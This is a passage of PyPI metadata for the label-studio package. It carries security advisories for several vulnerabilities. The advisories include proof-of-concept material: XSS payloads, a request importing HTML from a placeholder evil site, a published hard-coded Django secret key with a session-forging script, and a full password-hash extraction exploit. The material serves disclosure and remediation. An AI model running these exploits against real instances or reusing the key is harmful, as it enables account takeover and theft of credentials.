penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.1/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (==1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.17)","rq (==1.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"5cfa4bc3abb16d48d2e5c96df1792a295dd7d4a2b2cf127b0017d434e3910664","md5":"5f04113230b88fa4c60aa7c54ccc6a92","sha256":"0d6f632dcc5217c03b201d51dd7e4e9a4f3284d115b9bb88eaeeb8f60699520f"},"downloads":-1,"filename":"label_studio-0.7.1-py3-none-any.whl","has_sig":false,"md5_digest":"5f04113230b88fa4c60aa7c54ccc6a92","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6940503,"upload_time":"2020-06-05T22:16:12","upload_time_iso_8601":"2020-06-05T22:16:12.138789Z","url":"https://files.pythonhosted.org/packages/5c/fa/4bc3abb16d48d2e5c96df1792a295dd7d4a2b2cf127b0017d434e3910664/label_studio-0.7.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"4968ab4ef29ab04646626d82df7f80d3ae705c14daee2cdd35ecda0ed4f3d829","md5":"93692486be71040ba76a63a9bcab337a","sha256":"b366d6dc6f0ef02529567c61a4f4b49390b16d75fad5dbf23557c8244b6d97c6"},"downloads":-1,"filename":"label-studio-0.7.1.tar.gz","has_sig":false,"md5_digest":"93692486be71040ba76a63a9bcab337a","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6874081,"upload_time":"2020-06-05T22:17:17","upload_time_iso_8601":"2020-06-05T22:17:17.927087Z","url":"https://files.pythonhosted.org/packages/49/68/ab4ef29ab04646626d82df7f80d3ae705c14daee2cdd35ecda0ed4f3d829/label-studio-0.7.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the 